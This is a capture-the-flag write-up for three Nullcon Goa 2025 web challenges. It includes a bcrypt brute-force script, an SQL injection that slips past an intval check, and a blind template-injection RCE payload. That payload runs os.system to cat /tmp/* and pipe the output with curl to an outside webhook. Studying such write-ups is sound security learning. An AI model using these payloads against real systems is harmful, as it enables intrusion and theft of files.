------------------

### CTF-: NULLCON GOA 2025

------------------

![image](https://github.com/user-attachments/assets/55150e19-92a0-4611-9134-02347a556eba)

-------------------

### Web

- Bfail
- Temptation
- Pagination

--------------------

### WEB

--------------------

### Bfail

--------------------

![image](https://github.com/user-attachments/assets/f5cacbc1-654f-4d94-aeac-21b2c19eab8f)

--------------------

- Source Code

```python3
from flask import Flask, request, redirect, render_template_string
import sys
import os
import bcrypt
import urllib.parse

app = Flask(__name__)
app.secret_key = os.urandom(16);
# This is super strong! The password was generated quite securely. Here are the first 70 bytes, since you won't be able to brute-force the rest anyway...
# >>> strongpw = bcrypt.hashpw(os.urandom(128),bcrypt.gensalt())
# >>> strongpw[:71]
# b'\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9<\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76'
app.ADMIN_PW_HASH = b'$2b$12$8bMrI6D9TMYXeMv8pq8RjemsZg.HekhkQUqLymBic/cRhiKRa3YPK'
FLAG = open("flag.txt").read();

@app.route('/source')
def source():
    return open(__file__).read()

@app.route('/', methods=["GET"])
def index():

    username = request.form.get("username", None)
    password = request.form.get("password", None)

    if username and password:

        username = urllib.parse.unquote_to_bytes(username)
        password = urllib.parse.unquote_to_bytes(password)

        if username != b"admin":
            return "Wrong user!"

        if len(password) > 128:
            return "Password too long!"

        if not bcrypt.checkpw(password, app.ADMIN_PW_HASH):
            return "Wrong password!"

        return f"""Congrats! It appears you have successfully bf'ed the password. Here is your {FLAG}"""

    # Use f-string formatting within the template string
    template_string = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Bfail</title>
    </head>
    <body>
        <h1>Login to get my secret, but 'B'-ware of the strong password!</h1>
        <form action="/" method="post">
            <label for="username">Username:</label>
            <input type="text" name="username"  placeholder="admin">
            <br>
            <label for="password">Password:</label>
            <input type="password" name="password">
            <br>
            <button type="submit">Login</button>
        </form>
    <!-- See my <a href="/source">Source</a> -->
    </body>
    </html>
    """

    return render_template_string(template_string)

if __name__ == '__main__':
   app.run(debug=False, host="0.0.0.0", port="8080", threaded=True)
```

- The code below contains the vulnerable code snippet.

```python3
# This is super strong! The password was generated quite securely. Here are the first 70 bytes, since you won't be able to brute-force the rest anyway...
# >>> strongpw = bcrypt.hashpw(os.urandom(128),bcrypt.gensalt())
# >>> strongpw[:71]
# b'\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9<\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76'
app.ADMIN_PW_HASH = b'$2b$12$8bMrI6D9TMYXeMv8pq8RjemsZg.HekhkQUqLymBic/cRhiKRa3YPK'
```

- The dev created a password with `os.urandom(128)` which will generate 128 bytes and a random salt which will be hashed with `bcrypt.hashpw()`.Also, the 71 bytes of the generated password was provided and also the admin_hash.I found a post on [Stack Overflow](https://security.stackexchange.com/questions/39849/does-bcrypt-have-a-maximum-password-length) which states that bcrypt's maximum length for a password is `72` bytes.If a password is `128` bytes long, bcrypt will only pick 72 bytes out it.In this case,we have only 71 bytes,we have to brute force the last bytes.I created a script to brute force by looping through a single byte produced with `os.urandom(1)`.We don't ned to bother about the salt because bcrypt deduces the salt when the hash is passed to the `checkpw()` function.

- Bruteforce script

```python3
#! /usr/bin/env python3
import bcrypt
import os
hash = b'$2b$12$8bMrI6D9TMYXeMv8pq8RjemsZg.HekhkQUqLymBic/cRhiKRa3YPK'
password = b"\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9<\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76"
passed = b""
while True:
    passed = password + os.urandom(1)
    print(f"[+] Checking {passed}")
    if bcrypt.checkpw(passed,hash):
        print(f"[+] Password is {passed}")
        exit()
    else:
        print("[+] incorrect")
    passed = b''
```

- Result

![image](https://github.com/user-attachments/assets/60fe45ac-7201-42f9-99be-97684f4297d0)

- Then, I created a python script to pass the bytes password and get the flag.

```python3
#! /usr/bin/env python3
import requests
password = b'\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9<\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76\xaa'

data = {"username":"admin","password":password}
url = "http://52.59.124.14:5013/"
flag= requests.get(url,data=data).text
print(flag)
```

- Flag-:```ENO{BCRYPT_FAILS_TO_B_COOL_IF_THE_PW_IS_TOO_LONG}```

![image](https://github.com/user-attachments/assets/4c81b59d-6366-4128-94f4-915cc241c980)

------------------

### TEMPTATION

------------------

![image](https://github.com/user-attachments/assets/fa642616-c4b2-4e90-ab05-662737537c77)

------------------

- I was unable to get the source code using the path `/?source` but it worked when I pass a value to the query.

![image](https://github.com/user-attachments/assets/642d24f6-5a6a-463b-ad95-a6aa159712a6)

- Source Code-:

```python3
import web
from web import form
web.config.debug = False
urls = (
  '/', 'index'
)
app = web.application(urls, locals())
render = web.template.render('templates/')
FLAG = open("/tmp/flag.txt").read()

temptation_Form = form.Form(
    form.Password("temptation", description="What is your temptation?"),
    form.Button("submit", type="submit", description="Submit")
)

class index:
    def GET(self):
        try:
            i = web.input()
            if i.source:
                return open(__file__).read()
        except Exception as e:
            pass
        f = temptation_Form()
        return render.index(f)

    def POST(self):
        f = temptation_Form()
        if not f.validates():
            return render.index(f)
        i = web.input()
        temptation = i.temptation
        if 'flag' in temptation.lower():
            return "Too tempted!"
        try:
            temptation = web.template.Template(f"Your temptation is: {temptation}")()
        except Exception as  e:
            return "Too tempted!"
        if str(temptation) == "FLAG":
            return FLAG
        else:
            return "Too tempted!"
application = app.wsgifunc()
if __name__ == "__main__":
    app.run()
```

- I have not solved web chalenges related to this `web.py` framework.I was able to get the main sink by reading the docs for  function `web.template.Template()` function.According to this [page](https://webpy.org/docs/0.3/templetor), this function evaluates basically any python code passed to it.In relation to this challenge,it will amount to `Blind Remote Code Execution` because we will only be getting the results `Too Tempted`.

```python3
 try:
            temptation = web.template.Template(f"Your temptation is: {temptation}")()
        except Exception as  e:
            return "Too tempted!"
        if str(temptation) == "FLAG":
            return FLAG
        else:
            return "Too tempted!"
```

- Documentation explantaion-:

![image](https://github.com/user-attachments/assets/1677bed0-d6d7-4b70-83a5-4a59ab5a7e07)

-----------------

### Cooking up the payload

-----------------

- I created a payload with `__import__` to call module `os` for code execution.Since, it is blind, I leveraged on a [webhook](https://www.postb.in/) to receive requests.Lastly, I used curl to transfer the required information  that I need.

Payload-:

```powershell

 curl http://52.59.124.14:5011 -d "temptation=`$`__import__('os').system('cat /tmp/* | curl https://www.postb.in/1738504441196-5407698529306 -d \'@-\'')"

```

- Flag-: ```ENO{T3M_Pl4T_3S_4r3_S3cUre!!}```

![image](https://github.com/user-attachments/assets/7f428860-30c4-4e1d-8e94-efd03decb5ab)

-----------------

### Paginator

-----------------

![image](https://github.com/user-attachments/assets/2b69c99b-cb17-4168-8906-55ba36800727)

-----------------

- Source Code-:

```php
<?php
ini_set("error_reporting", 0);
ini_set("display_errors",0);

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "flag.php";

$db = new SQLite3('/tmp/db.db');
try {
  $db->exec("CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Flag', '" . base64_encode($FLAG) . "')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 1', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 2', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 3', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 4', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 5', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 6', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 7', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 8', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 9', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 10', 'This is not a flag, but just a boring page.')");
} catch(Exception $e) {
  //var_dump($e);
}


if(isset($_GET['p']) && str_contains($_GET['p'], ",")) {
  [$min, $max] = explode(",",$_GET['p']);
  if(intval($min) <= 1 ) {
    die("This post is not accessible...");
  }
  try {
    $q = "SELECT * FROM pages WHERE id >= $min AND id <= $max";
    $result = $db->query($q);
    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
      echo $row['title'] . " (ID=". $row['id'] . ") has content: \"" . $row['content'] . "\"<br>";
    }
  }catch(Exception $e) {
    echo "Try harder!";
  }
} else {
    echo "Try harder!";
}
?>

```

- The code creates an sqlite3 db and inserts the base64  encoded flag into table `1` and other posts.

```php
$db = new SQLite3('/tmp/db.db');
try {
  $db->exec("CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Flag', '" . base64_encode($FLAG) . "')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 1', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 2', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 3', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 4', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 5', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 6', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 7', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 8', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 9', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 10', 'This is not a flag, but just a boring page.')");
} 
```

- The code below checks if `GET` param `p` is set and also if it contains the char `,`.Then, it splits the value with func `explode` based on the delimiter `,`.These numbers are tagged with variable `min` and `max`.It also checks if the min value is lesser that 1 after parsing it with the `intval()` function and if lesser or equal to 1, it raises the `post is not accessible` and close the script.

```php
if(isset($_GET['p']) && str_contains($_GET['p'], ",")) {
  [$min, $max] = explode(",",$_GET['p']);
  if(intval($min) <= 1 ) {
    die("This post is not accessible...");
  }
```

- Later, the min and max variables are passed to the sqlite3 statement which is vulnerable to sqli.

```php
try {
    $q = "SELECT * FROM pages WHERE id >= $min AND id <= $max";
    $result = $db->query($q);
    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
      echo $row['title'] . " (ID=". $row['id'] . ") has content: \"" . $row['content'] . "\"<br>";
    }
  }catch(Exception $e) {
    echo "Try harder!";
  }
} else {
    echo "Try harder!";
}
```

- We need to pass in value `1` to get the flag which we can do easily by fooling the intval() function.`intval()` return the first number it spots in a situation where the remaining characters are alphabets or mathematical symbols. e.g

```zsh
php > echo intval('2-1');
2                                                               
php >

```

- Our query will be something like `2-1,10`, sqlite3 also calculates mathematical expressions passed to it.Sqlite3 will calculate `2-1` to `1` and render the flag.

![image](https://github.com/user-attachments/assets/792a4d79-1984-4ee9-96a1-c9b109fd098b)

- Base64 decoded flag-: `ENO{SQL1_W1th_0uT_C0mm4_W0rks_SomeHow!}`

```pwsh
▓   HP       ❯  echo "RU5Pe1NRTDFfVzF0aF8wdVRfQzBtbTRfVzBya3NfU29tZUhvdyF9" | base64 -d
ENO{SQL1_W1th_0uT_C0mm4_W0rks_SomeHow!}
▓   HP       ❯
```

-------------

### REFERENCES-:

- [Bcrypt's password length](https://security.stackexchange.com/questions/39849/does-bcrypt-have-a-maximum-password-length)
- [Templetor code evaluation](https://webpy.org/docs/0.3/templetor)

------------




